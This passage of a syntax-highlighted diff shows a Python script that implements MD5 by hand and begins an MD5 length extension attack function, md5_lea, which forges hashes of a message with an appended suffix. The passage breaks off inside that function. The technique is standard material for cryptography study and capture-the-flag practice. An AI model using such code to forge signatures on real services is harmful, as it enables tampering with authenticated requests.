+</span></span><span class="line"><span class="cl"><span class="c1"># @Last Modified time: 2018-08-12 15:08:28</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">math</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">F</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">:</span> <span class="p">((</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">y</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="o">~</span><span class="n">x</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">z</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">G</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">:</span> <span class="p">((</span><span class="n">x</span> <span class="o">&amp;</span> <span class="n">z</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">y</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span><span class="n">z</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">H</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">:</span> <span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="o">^</span> <span class="n">z</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">I</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">:</span> <span class="p">(</span><span class="n">y</span> <span class="o">^</span> <span class="p">(</span><span class="n">x</span> <span class="o">|</span> <span class="p">(</span><span class="o">~</span><span class="n">z</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">L</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">:</span> <span class="p">(((</span><span class="n">x</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">n</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xffffffff</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">shi_1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">22</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">shi_2</span> <span class="o">=</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">20</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">shi_3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">23</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">shi_4</span> <span class="o">=</span> <span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">21</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_1</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_2</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m_4</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">T</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">4294967296</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">i</span><span class="p">))))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shift</span><span class="p">(</span><span class="n">shift_list</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">shift_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">shift_list</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">shift_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">shift_list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">shift_list</span><span class="p">[</span><span class="mi">2</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">shift_list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fun</span><span class="p">(</span><span class="n">fun_list</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">m</span><span class="p">,</span> <span class="n">shi</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">Ti_count</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">fun_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">f</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">fun_list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">fun_list</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">),</span> <span class="nb">int</span><span class="p">(</span><span class="n">fun_list</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">))</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="n">count</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">T</span><span class="p">(</span><span class="n">Ti_count</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">xx</span> <span class="o">&amp;=</span> <span class="mh">0xffffffff</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ll</span> <span class="o">=</span> <span class="n">L</span><span class="p">(</span><span class="n">xx</span><span class="p">,</span> <span class="n">shi</span><span class="p">[</span><span class="n">count</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fun_list</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">fun_list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">ll</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fun_list</span> <span class="o">=</span> <span class="n">shift</span><span class="p">(</span><span class="n">fun_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Ti_count</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">fun_list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gen_m16</span><span class="p">(</span><span class="n">order</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">f_offset</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ii</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">    <span class="n">m16</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">16</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f_offset</span> <span class="o">*=</span> <span class="mi">64</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">order</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">*=</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">        <span class="n">m16</span><span class="p">[</span><span class="n">ii</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">((</span><span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">f_offset</span><span class="p">]</span> <span class="o">+</span> <span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">f_offset</span><span class="p">]</span> <span class="o">+</span> <span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">f_offset</span><span class="p">]</span> <span class="o">+</span> <span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">f_offset</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ii</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">ind</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">m16</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">m16</span><span class="p">[</span><span class="n">ind</span><span class="p">]</span> <span class="o">=</span> <span class="n">reverse_hex</span><span class="p">(</span><span class="n">m16</span><span class="p">[</span><span class="n">ind</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">m16</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reverse_hex</span><span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_str</span> <span class="o">=</span> <span class="n">hex_str</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_str</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">))</span> <span class="o">+</span> <span class="n">hex_str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_str_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">hex_str</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_str_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">hex_str</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_str_list</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hex_str_result</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">hex_str_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hex_str_result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show_result</span><span class="p">(</span><span class="n">f_list</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f_list1</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f_list</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f_list1</span><span class="p">[</span><span class="n">f_list</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span> <span class="o">=</span> <span class="n">reverse_hex</span><span class="p">(</span><span class="n">i</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="n">f_list1</span><span class="p">[</span><span class="n">f_list</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">padding</span><span class="p">(</span><span class="n">input_m</span><span class="p">,</span> <span class="n">msg_lenth</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_list</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">hex</span><span class="p">,</span> <span class="nb">map</span><span class="p">(</span><span class="nb">ord</span><span class="p">,</span> <span class="n">input_m</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_lenth</span> <span class="o">+=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;0x80&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="s1">&#39;0&#39;</span> <span class="o">+</span> <span class="n">ascii_list</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">64</span><span class="p">)</span> <span class="o">%</span> <span class="mi">512</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ascii_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;0x00&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_lenth_0x</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">msg_lenth</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_lenth_0x</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">msg_lenth_0x</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_lenth_0x_big_order</span> <span class="o">=</span> <span class="n">reverse_hex</span><span class="p">(</span><span class="n">msg_lenth_0x</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_lenth_0x_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">msg_lenth_0x_big_order</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg_lenth_0x_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">msg_lenth_0x_big_order</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_list</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">msg_lenth_0x_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ascii_list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">input_m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">Ti_count</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ti_count</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">abcd_list</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;0x67452301&#39;</span><span class="p">,</span> <span class="s1">&#39;0xefcdab89&#39;</span><span class="p">,</span> <span class="s1">&#39;0x98badcfe&#39;</span><span class="p">,</span> <span class="s1">&#39;0x10325476&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_list</span> <span class="o">=</span> <span class="n">padding</span><span class="p">(</span><span class="n">input_m</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">aa</span><span class="p">,</span> <span class="n">bb</span><span class="p">,</span> <span class="n">cc</span><span class="p">,</span> <span class="n">dd</span> <span class="o">=</span> <span class="n">abcd_list</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_1</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_1</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_2</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_2</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_3</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_3</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">order_4</span> <span class="o">=</span> <span class="n">gen_m16</span><span class="p">(</span><span class="n">m_4</span><span class="p">,</span> <span class="n">ascii_list</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">F</span><span class="p">,</span> <span class="n">order_1</span><span class="p">,</span> <span class="n">shi_1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">G</span><span class="p">,</span> <span class="n">order_2</span><span class="p">,</span> <span class="n">shi_2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">H</span><span class="p">,</span> <span class="n">order_3</span><span class="p">,</span> <span class="n">shi_3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="n">fun</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">,</span> <span class="n">I</span><span class="p">,</span> <span class="n">order_4</span><span class="p">,</span> <span class="n">shi_4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_a</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">aa</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_b</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_c</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">cc</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output_d</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="nb">int</span><span class="p">(</span><span class="n">dd</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">output_a</span><span class="p">,</span> <span class="n">output_b</span><span class="p">,</span> <span class="n">output_c</span><span class="p">,</span> <span class="n">output_d</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Ti_count</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">show_result</span><span class="p">(</span><span class="n">abcd_list</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># md5-Length Extension Attack: 计算 md5(message + padding + suffix), res = md5(message), len_m = len(message)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">md5_lea</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">len_m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">Ti_count</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Ti_count</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">abcd_list</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">abcd_list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">reverse_hex</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span> <span class="o">+</span> <span class="n">res</span><span class="p">[</span><span class="n">i</span><span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(abcd_list)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ascii_list</span> <span class="o">=</span> <span class="n">padding</span><span class="p">(</span><span class="n">suffix</span><span class="p">,</span> <span class="p">(</span><span class="n">len_m</span> <span class="o">+</span> <span class="mi">72</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># len(message + padding) * 8</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># print(ascii_list)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ascii_list</span><span class="p">)</span> <span class="o">//</span> <span class="mi">64</span><span class="p">):</span>
